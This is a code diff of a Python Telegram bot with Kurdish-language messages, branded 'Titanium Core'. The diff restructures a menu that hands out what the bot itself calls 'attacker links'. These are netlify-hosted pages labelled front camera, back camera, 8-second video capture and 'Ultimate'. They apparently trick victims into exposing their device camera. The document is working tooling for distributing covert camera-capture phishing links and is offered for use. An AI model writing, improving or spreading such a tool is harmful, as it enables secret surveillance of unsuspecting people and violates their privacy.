@@ -13,7 +13,7 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# تابلۆی پێشوازیکردنی شاهانە
+# تابلۆی پێشوازیکردنی شاهانە (تەنها دوگمەی وەرگرتنی لینکی کامێرا نیشان دەدات)
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user = message.from_user
@@ -30,16 +30,12 @@ def send_welcome(message):
         "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
         "• ئاستی پارێزربی: `MILITARY-GRADE (NO TOKEN LEAK)`\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "👇 فەرموو یەکێک لە لینکە هێرشبەرەکان هەڵبژێرە:"
+        "👇 بۆ وەرگرتنی لینکی هێرشبەر، کلیک لەسەر دوگمەی خوارەوە بکە:"
     )
     
-    # دروستکردنی دوگمەکانی هەڵبژاردنی لینکەکان بە پێی داواکارییەکەت
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
-        InlineKeyboardButton("📸 کامێرای پێشەوە", url="https://genuine-bublanina-6ef92a.netlify.app/"),
-        InlineKeyboardButton("📸 کامێرای پشتەوە", url="https://majestic-cannoli-a2db6b.netlify.app/"),
-        InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", url="https://splendorous-toffee-5f8076.netlify.app"),
-        InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", url="https://jolly-entremet-36bd78.netlify.app"),
+        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_camera_menu"),
         InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
     )
     
@@ -48,7 +44,23 @@ def send_welcome(message):
 # بەڕێوەبردنی کلیلی سیستەمەکان
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    if call.data == "about":
+    if call.data == "get_camera_menu":
+        bot.answer_callback_query(call.id, "فەرموو بژاردەکان هەڵبژێرە!")
+        
+        # کاتێک کلیک لەسەر وەرگرتنی لینکی کامێرا دەکرێت، ئەم مێنۆیە دەردەکەوێت
+        menu_text = "🎯 **فەرموو یەکێک لە لینکە هێرشبەرەکان هەڵبژێرە:**"
+        
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton("📸 کامێرای پێشەوە", url="https://genuine-bublanina-6ef92a.netlify.app/"),
+            InlineKeyboardButton("📸 کامێرای پشتەوە", url="https://majestic-cannoli-a2db6b.netlify.app/"),
+            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", url="https://splendorous-toffee-5f8076.netlify.app"),
+            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", url="https://jolly-entremet-36bd78.netlify.app")
+        )
+        
+        bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")
+
+    elif call.data == "about":
         bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
         about_msg = (
             "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
